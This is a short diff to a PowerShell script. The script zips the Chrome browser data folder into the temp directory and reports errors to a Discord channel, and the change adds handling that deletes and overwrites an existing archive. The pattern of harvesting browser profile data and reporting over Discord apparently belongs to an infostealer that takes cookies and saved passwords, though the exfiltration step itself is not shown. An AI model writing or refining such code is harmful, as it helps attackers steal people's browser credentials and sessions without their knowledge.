@@ -97,9 +97,15 @@ if (-not (Test-Path $chromePath)) {
 
 # Use Compress-Archive for zipping (this is a built-in PowerShell cmdlet)
 $outputZip = "$env:TEMP\chrome_data.zip"
-try {
-    Compress-Archive -Path $chromePath -DestinationPath $outputZip
 
+# Remove the existing zip file if it exists
+if (Test-Path $outputZip) {
+    Remove-Item $outputZip -Force
+}
+
+try {
+    # Create the zip file, force overwrite if it exists
+    Compress-Archive -Path $chromePath -DestinationPath $outputZip -Force
     Write-Host "Compression successful, file saved at: $outputZip"
 } catch {
     Send-DiscordMessage -message "Error creating zip file with Compress-Archive: $_"
